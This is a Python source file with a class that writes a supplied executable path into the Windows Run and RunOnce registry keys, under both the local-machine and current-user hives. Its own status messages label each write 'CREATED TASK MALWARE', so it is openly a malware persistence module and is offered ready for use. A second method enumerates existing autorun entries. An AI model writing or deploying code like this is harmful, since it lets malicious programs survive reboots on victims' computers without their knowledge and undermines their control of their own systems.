import winreg,os

__all__ = ["TASKWINDOWS"]

class TASKWINDOWS(object):
    def __new__(cls,exeinit:str):
        rb = object.__new__(cls)
        return rb
    def __init__(self,exeinit:str):
        self.__mdr = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        self.__udr = r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
        self.__ex = exeinit
        self.__mky = winreg.HKEY_LOCAL_MACHINE
        self.__uky = winreg.HKEY_CURRENT_USER
        self.__mag = winreg.ConnectRegistry(None,self.__mky)
        self.__uag = winreg.ConnectRegistry(None,self.__uky)
        self.__per = winreg.KEY_ALL_ACCESS
    def __str__(self):
        return "ACCESS REGISTERY KEYS / TASK - PROCESS"
    def __call__(self):
        return
    def __getstate__(self):
        raise TypeError("D.E.N.I.E.D")
    def __repr__(self):
        return TASKWINDOWS.__doc__
    def _OPENREGKEY(self,mg,mr):
        try:
            tex = []
            tnm = []
            mreg = winreg.OpenKey(mg,mr,0,self.__per)
            numk = winreg.QueryInfoKey(mreg)
            for ie in range(numk[1]):
                try:
                    kn,kv,kt = winreg.EnumValue(mreg,ie)
                    tex.append(kn)
                    tnm.append(kv)
                except KeyboardInterrupt:
                    winreg.CloseKey(mreg)
                except EnvironmentError:
                    winreg.CloseKey(mreg)
                    raise UserWarning("PLATFORM ERROR - FAILED")
                except Exception as err:
                    # print(str(err))
                    pass
        except KeyboardInterrupt:
            winreg.CloseKey(mreg)
            raise UserWarning("CLOSED BY USER")
        except EnvironmentError:
            winreg.CloseKey(mreg)
            raise UserWarning("PLATFORM ERROR - FAILED")
        except Exception as err:
            winreg.CloseKey(mreg)
            # print(str(err))
            pass
        try:
            winreg.CloseKey(mreg)
        except:
            pass
        if len(tex) != 0 and len(tnm) != 0:
            return tex,tnm
        else:
            return False
    def _WRITEKEY(self,mg,mr,valname:str):
        mreg = winreg.OpenKey(mg,mr,0,self.__per)
        try:
            try:
                winreg.SetValueEx(mreg,
                                  valname,
                                  0,
                                  winreg.REG_SZ,
                                  self.__ex)
                print("KEY-DONE")
            except KeyboardInterrupt:
                winreg.CloseKey(mreg)
                raise UserWarning("CLOSED BY USER")
            except EnvironmentError:
                winreg.CloseKey(mreg)
                raise UserWarning("PLATFORM ERROR - FAILED")
            except Exception as err:
                winreg.CloseKey(mreg)
                # print(str(err))
                pass
        except Exception as err:
            # print(str(err))
            winreg.CloseKey(mreg)
        try:
            winreg.CloseKey(mreg)
        except:
            pass
    def _LAUNCH(self,mkeyname:str):
        try:
            try:
                self._WRITEKEY(self.__mag,self.__mdr,mkeyname)
                print("1-OK / CREATED TASK MALWARE")
            except:
                pass
            try:
                self._WRITEKEY(self.__mag,self.__udr,mkeyname)
                print("2-OK / CREATED TASK MALWARE")
            except:
                pass
            try:
                self._WRITEKEY(self.__uag,self.__mdr,mkeyname)
                print("3-OK / CREATED TASK MALWARE")
            except:
                pass
            try:
                self._WRITEKEY(self.__uag,self.__udr,mkeyname)
                print("4-OK / CREATED TASK MALWARE")
            except:
                pass
        except KeyboardInterrupt:
            raise UserWarning("CLOSED BY USER")
        except:
            pass